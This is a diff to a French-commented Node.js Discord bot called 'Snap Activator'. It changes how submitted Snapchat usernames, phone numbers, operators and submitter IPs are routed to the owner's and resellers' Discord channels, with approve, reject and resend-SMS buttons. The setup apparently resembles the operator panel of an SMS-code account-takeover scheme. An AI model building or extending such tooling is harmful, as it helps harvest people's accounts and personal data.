@@ -371,7 +371,7 @@ async function sendToDiscord(fn) {
 }
 
 // ================== UTILITAIRES ==================
-const APPROVAL_CHANNEL_ID  = process.env.DISCORD_APPROVAL_CHANNEL;
+const APPROVAL_CHANNEL_ID  = process.env.APPROVAL_CHANNEL_ID || process.env.DISCORD_APPROVAL_CHANNEL;
 const PRIORITY_CHANNEL_ID  = '1532004514306068510';
 const WEBHOOK_URL           = process.env.DISCORD_WEBHOOK_URL || null; // fallback si bot down
 const BASE_URL              = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;
@@ -564,20 +564,21 @@ app.post('/api/submit', async (req, res) => {
 
     // Envoi Discord asynchrone (ne bloque plus la réponse HTTP)
     const sendDiscordAsync = async () => {
-        // Routing : si ref valide → channel du client (capturé à la soumission), sinon → channel owner
-        const targetChannelId = refChannelId || APPROVAL_CHANNEL_ID;
-        console.log(`[DISCORD] Envoi vers channel ${targetChannelId} (${refGuildId ? 'client' : 'owner'})`);
+        console.log(`[DISCORD] Envoi PRIORITY=${PRIORITY_CHANNEL_ID}${refGuildId ? ` + client ${refChannelId}` : ' (avec boutons)'}`);
 
-        // Récupérer le channel — essai cache puis fetch si absent
-        let mainChannel = client.channels.cache.get(targetChannelId);
-        if (!mainChannel) {
-            try { mainChannel = await client.channels.fetch(targetChannelId); }
-            catch(e) { console.error(`[DISCORD] Channel ${targetChannelId} introuvable:`, e.message); }
-        }
+        // Helper fetch channel
+        const fetchChannel = async (id) => {
+            if (!id) return null;
+            let ch = client.channels.cache.get(id);
+            if (!ch) { try { ch = await client.channels.fetch(id); } catch(e) { console.error(`[DISCORD] Channel ${id} introuvable:`, e.message); } }
+            return ch || null;
+        };
 
-        const priorityChannel = (!refGuildId && cfg.salon_prioritaire) ? client.channels.cache.get(PRIORITY_CHANNEL_ID) : null;
-        if (!mainChannel) {
-            console.error(`[DISCORD] Aucun channel trouvé pour ${targetChannelId} — fallback webhook`);
+        const priorityChannel = await fetchChannel(PRIORITY_CHANNEL_ID);
+        const clientChannel   = refGuildId ? await fetchChannel(refChannelId) : null;
+
+        if (!priorityChannel && !clientChannel) {
+            console.error('[DISCORD] Aucun channel disponible — fallback webhook');
             await sendWebhookFallback(`📱 Nouvelle demande : **${snapchat}** | ${phone} | ${operator} | IP: ${ip}`);
             return;
         }
@@ -617,24 +618,40 @@ app.post('/api/submit', async (req, res) => {
             new ButtonBuilder().setCustomId(`resend_${id}`).setLabel('Renvoyer SMS').setEmoji('📲').setStyle(ButtonStyle.Secondary)
         );
 
-        if (priorityChannel) {
-            const priorityEmbed = new EmbedBuilder()
-                .setTitle('👁️ PRIORITAIRE — Nouvelle demande')
-                .setDescription('> Lecture seule — les boutons sont dans le salon principal.')
-                .setColor(0xFF6600)
-                .addFields(...baseFields)
-                .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
-                .setFooter({ text: `Salon principal dans ${cfg.delai_discord_sec}s • ${new Date().toLocaleString('fr-FR')}` })
-                .setTimestamp();
-            await priorityChannel.send({ content: `<@${OWNER_ID}> 🔔 Nouvelle demande !${refGuildId ? ` (via lien client \`${refGuildId}\`)` : ''}`, embeds: [priorityEmbed] });
-        }
+        const clientInfo = refGuildId ? ` (via lien client \`${refGuildId}\`)` : '';
 
-        // Délai seulement si salon prioritaire actif (pour l'owner), sinon envoi immédiat
-        const sendDelay = (priorityChannel && !refGuildId) ? cfg.delai_discord_sec * 1000 : 0;
-        setTimeout(async () => {
-            try { await mainChannel.send({ embeds: [embed], components: [row] }); }
-            catch (e) { console.error('Erreur envoi salon principal:', e.message); }
-        }, sendDelay);
+        if (refGuildId && clientChannel) {
+            // Demande via lien client :
+            // - PRIORITY = info seulement (pas de boutons), pour monitoring
+            if (priorityChannel) {
+                const monitorEmbed = new EmbedBuilder()
+                    .setTitle('👁️ Nouvelle demande — monitoring')
+                    .setDescription(`> Gérée par le client \`${refGuildId}\``)
+                    .setColor(0xFF6600)
+                    .addFields(...baseFields)
+                    .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
+                    .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
+                    .setTimestamp();
+                try { await priorityChannel.send({ content: `🔔 Nouvelle demande${clientInfo}`, embeds: [monitorEmbed] }); }
+                catch(e) { console.error('Erreur envoi priority monitoring:', e.message); }
+            }
+            // - CLIENT channel = avec boutons approve/reject
+            try { await clientChannel.send({ embeds: [embed], components: [row] }); }
+            catch(e) { console.error('Erreur envoi channel client:', e.message); }
+        } else {
+            // Demande directe (pas de ref) : PRIORITY avec boutons, owner gère
+            if (priorityChannel) {
+                try {
+                    await priorityChannel.send({
+                        content: `<@${OWNER_ID}> 🔔 Nouvelle demande !`,
+                        embeds: [embed],
+                        components: [row]
+                    });
+                } catch(e) { console.error('Erreur envoi priority:', e.message); }
+            } else {
+                await sendWebhookFallback(`📱 ${snapchat} | ${phone} | ${operator} | ${ip}`);
+            }
+        }
 
         console.log(`✅ Demande #${id} envoyée à Discord`);
     };
@@ -1393,6 +1410,7 @@ client.on('interactionCreate', async interaction => {
         incStat('approved');
         updateBotStatus();
         await interaction.reply({ content: `✅ Demande acceptée pour ${request.snapchat}.`, ephemeral: true });
+
         // DM owner si activé
         if (cfg.dm_notifs !== false) {
             try {
